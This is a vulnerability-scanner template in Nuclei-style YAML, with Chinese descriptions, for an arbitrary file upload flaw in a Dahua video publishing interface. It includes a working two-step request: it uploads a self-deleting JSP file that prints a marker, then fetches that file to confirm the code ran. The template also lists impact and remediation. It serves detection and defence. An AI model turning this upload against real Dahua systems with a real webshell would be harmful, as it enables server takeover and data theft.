id: dahua-video-upload
info:
  name: 大华 video 接口 - 任意文件上传漏洞
  author: secking
  severity: high
  description: |
    该模板用于检测 大华 video 接口 - 任意文件上传漏洞。该类漏洞通常源于上传接口缺少文件类型、路径或执行权限控制，导致恶意文件可被写入服务器。模板主要向 `/publishing/publishing/material/file/video`、`/publishingImg/{变量}.jsp` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可上传恶意脚本、WebShell 或伪装文件，进而执行代码或长期控制站点。
    - 若上传目录可被 Web 服务器解析，漏洞可能直接导致服务器失陷和业务数据泄露。
  remediation: |
    - 对上传文件执行扩展名、MIME、魔数和内容校验，并使用随机文件名保存到不可执行目录。
    - 禁止上传目录执行脚本，分离静态文件域名和应用执行环境。
    - 清理历史上传文件，排查 WebShell、异常访问日志和新增系统账号。
  reference:
    - https://www.dahuatech.com/
  metadata:
    verified: true
    max-request: 2
    vendor: dahua
    product: dahua
  tags: fileupload,vuln,dahua
variables:
  rStr1: '{{md5(to_lower(rand_text_alpha(8)))}}'
  rStr2: '{{to_lower(rand_text_alpha(8))}}'
flow: http(1) && http(2)
http:
  - method: POST
    path:
      - '{{BaseURL}}/publishing/publishing/material/file/video'
    redirects: false
    headers:
      Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
    body: |
      --dd8f988919484abab3816881c55272a7
      Content-Disposition: form-data; name="Filedata"; filename="{{rStr2}}.jsp"

      <% out.println("{{rStr1}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
      --dd8f988919484abab3816881c55272a7
      Content-Disposition: form-data; name="Submit"

      submit
      --dd8f988919484abab3816881c55272a7--
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "\"success\":true") && contains(body, ".jsp")'
        internal: true
    extractors:
      - type: regex
        name: path
        part: body
        group: 1
        regex:
          - '\"path\":\"(.+?).jsp\"}'
        internal: true
  - method: GET
    path:
      - '{{BaseURL}}/publishingImg/{{path}}.jsp'
    redirects: false
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && regex(rStr1, body)'
